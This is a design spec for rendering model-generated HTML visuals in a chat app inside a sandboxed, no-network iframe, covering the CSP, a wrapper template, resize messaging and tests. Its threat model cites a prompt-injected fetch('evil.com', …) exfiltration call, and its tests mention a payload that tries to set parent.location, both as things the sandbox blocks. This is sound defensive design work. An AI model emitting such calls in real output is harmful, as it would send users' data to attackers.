# Visual Artifacts in Chat — Design Spec

**Date:** 2026-06-25
**Status:** Approved
**Author:** Yathu Arul (with Claude)

## Goal

Let the model enrich certain responses with a custom visual rendered inline in
the chat, by emitting self-contained HTML/CSS/JS that we render in a
**sandboxed iframe**. Targets one-shot visuals that plain prose/markdown can't
express well: styled cards/callouts, comparison/data layouts, simple
diagrams/timelines, and simple charts.

## Motivation / where this fits

The app already has two rendering layers:

1. **Markdown** (`components/assistant-ui/markdown-text.tsx`) — live now; renders
   headings, lists, **tables**, code, etc. Covers a lot of "structured text".
2. **Structured generative UI** via tool calls (the `get_current_weather`
   weather card) — typed, safe, pre-built React components keyed to a tool.

This feature adds a **third layer**: free-form, model-authored visuals for
one-off cases where building a dedicated component isn't worth it and markdown
isn't expressive enough.

## Non-goals (this POC)

- Editing, persisting, versioning, or exporting artifacts.
- Multi-file artifacts.
- External libraries, CDNs, or any network access from the artifact.
- A general "code interpreter" / runnable-app surface.

## Approach (chosen)

**Fenced ` ```visual ` block + custom markdown renderer.** Considered and
rejected for this POC: a dedicated tool (`show_visual({ html })`) — more robust
but heavier and further from the "model returns HTML" mental model; and a
custom structured message part — overkill. The fenced-block approach keeps prose
and visual interleaved in one natural response and builds on the markdown
pipeline already wired up.

The model writes a single fenced block tagged `visual` whose body is the visual
content (HTML + inline `<style>` + optional inline `<script>`). The markdown
renderer detects language `visual` and renders it as a sandboxed iframe instead
of a code listing. A response can interleave prose and one or more visuals.

## Security model (the crux)

Rendering model-generated HTML/JS is an XSS risk; the design treats the artifact
as **untrusted** and isolates it on two independent layers.

### 1. Iframe sandbox
- `sandbox="allow-scripts"` **without** `allow-same-origin`. Scripts run, but the
  document is a **null origin**: no access to the parent app's DOM, cookies,
  `localStorage`/`sessionStorage`, or session.
- Content delivered via `srcdoc` (no external URL).

### 2. Enforced CSP (we control it, not the model)
We never trust the model to set security. The model supplies only the inner
content; **we** wrap it in a fixed document template that injects a strict CSP:

```
default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; font-src data:;
```

Effect: **no network of any kind** (no `fetch`/XHR/WebSocket/`sendBeacon`, no
remote images/scripts/fonts), inline styles + inline scripts only, `data:` images
allowed. A prompt-injected `fetch('evil.com', { … })` or remote-image beacon
simply cannot fire. `'unsafe-inline'` is acceptable here because isolation comes
from the null-origin sandbox, not from CSP nonces.

Because the model can't omit or weaken the CSP (it's in our template, not the
model's output), security does not depend on model compliance.

### Wrapper document template (illustrative)

```html
<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="Content-Security-Policy"
      content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; font-src data:;" />
    <style>
      html, body { margin: 0; padding: 0; }
      body { font: 14px/1.5 system-ui, sans-serif; color: #0f172a; }
    </style>
  </head>
  <body>
    <!-- MODEL CONTENT INSERTED HERE (inert string interpolation into srcdoc) -->
    <script>
      // Height handshake — injected by us; the model never sees this.
      var report = function () {
        parent.postMessage(
          { type: "aui-artifact-resize", height: document.documentElement.scrollHeight },
          "*"
        );
      };
      try { new ResizeObserver(report).observe(document.documentElement); } catch (e) {}
      window.addEventListener("load", report);
      report();
    </script>
  </body>
</html>
```

The model content is interpolated into `srcdoc` as a string — it is **not**
parsed/executed in the parent; the only place it runs is inside the sandboxed
iframe.

## Auto-sizing

The injected script posts the document's `scrollHeight` to the parent via
`postMessage`. The parent's `VisualArtifact` component listens for
`message` events, accepts only those whose `event.source` is this iframe's
`contentWindow` and whose `data.type === "aui-artifact-resize"`, and sets the
iframe height (clamped to a max; taller content scrolls inside the iframe). All
other messages are ignored.

## System prompt (server-side, authoritative)

Set in `app/api/chat/route.ts` so it always applies regardless of client input.
Contract conveyed to the model (final wording tuned in implementation):

- Default to normal prose/markdown. Use a `visual` block **only** when a custom
  layout materially helps — styled cards/callouts, comparisons, diagrams,
  simple charts.
- Emit the visual as a single fenced ` ```visual ` block containing the
  **content only** — HTML plus an optional inline `<style>` and inline
  `<script>`. Do **not** include `<html>`/`<head>`/`<body>` wrappers (we add
  them).
- Self-contained: inline CSS/JS only. **No external resources and no network**
  (no remote scripts, styles, fonts, images, or fetch). Use `data:` URIs if an
  image is essential.
- Make it responsive to the container width.
- For charts, draw with `<canvas>` or inline SVG (no chart library).
- Keep it focused; you may still write prose around the block.

## Charts decision

**No network, no external chart library.** The model draws charts with
`<canvas>`/SVG. Rationale: keeps the sandbox airtight (no exfiltration channel
exists), no supply-chain/version/SRI baggage, works offline, and the chosen use
cases (bar/line/pie) are reliably within the model's reach.

**Escalation path (future, not this POC):** if hand-drawn charts prove
insufficient, bundle a chart library into the wrapper template ourselves
(inject the library's JS into `srcdoc` from our own app) — this keeps the iframe
fully no-network while giving it a real library. Opening the CSP to a CDN is
explicitly **not** the escalation path; it trades away the design's cleanest
property for convenience not yet needed.

## Streaming behavior

The fenced block streams token-by-token. We render the iframe **only once the
block is complete** (closing fence seen), to avoid repeatedly reloading a
half-written document. While the block is still streaming, show a lightweight
"Building visual…" placeholder.

## Files / components

- **`components/assistant-ui/visual-artifact.tsx`** (new) — `VisualArtifact`:
  takes the model's HTML string, wraps it in the CSP + resize template, renders a
  sandboxed iframe via `srcdoc`, and runs the height handshake. One clear
  responsibility: safely render one untrusted visual.
- **`components/assistant-ui/markdown-text.tsx`** (modify) — register language
  `visual` to render `VisualArtifact` instead of a code listing; show the
  "Building visual…" placeholder until the block completes. (Exact
  `@assistant-ui/react-markdown` override API — `componentsByLanguage` vs a
  `code`/`pre` override keyed on the `language-visual` class — resolved during
  implementation.)
- **`app/api/chat/route.ts`** (modify) — add the authoritative server-side
  system prompt describing when/how to emit `visual` blocks. Make it the base
  system prompt (combined with, and taking precedence for the artifact rules
  over, any client-provided `system`).
- **`app/page.tsx`** (optional) — add a demo suggestion (e.g. "Compare React vs
  Vue as a visual") to make the feature easy to try.

## Testing / verification

Same strategy as the weather card: production build + a headless-browser
(Playwright) check against the dev server:

1. A prompt that should trigger a visual renders a **sandboxed iframe** whose
   `sandbox` attribute includes `allow-scripts` and **excludes**
   `allow-same-origin`.
2. An inline script inside the artifact runs (e.g. a `<canvas>` chart paints) —
   confirmed via screenshot and/or a marker the iframe reports.
3. Containment: the wrapper CSP string is present in the rendered `srcdoc`, and a
   payload that attempts `parent.location = …` does not change the parent URL;
   no network request can leave the artifact (enforced by CSP `default-src
   'none'`).
4. The host page still streams normal prose and the existing weather card
   unaffected.

## Open items (resolved during implementation)

- Exact `@assistant-ui/react-markdown` API for overriding rendering of a single
  fenced language, and the signal for "code block complete" during streaming.
- Final system-prompt wording and how it composes with the client `system`
  forwarded by `AssistantChatTransport`.
